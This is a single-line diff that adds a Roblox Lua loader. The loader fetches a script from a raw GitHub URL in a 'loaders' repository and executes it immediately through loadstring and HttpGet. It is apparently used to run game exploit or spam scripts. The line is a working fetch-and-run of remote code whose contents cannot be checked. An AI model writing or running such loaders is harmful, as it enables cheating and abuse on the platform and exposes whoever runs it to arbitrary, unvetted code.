@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/contracts-toons-universe-spam3-0rkhc86tonz7y3.lua"))()
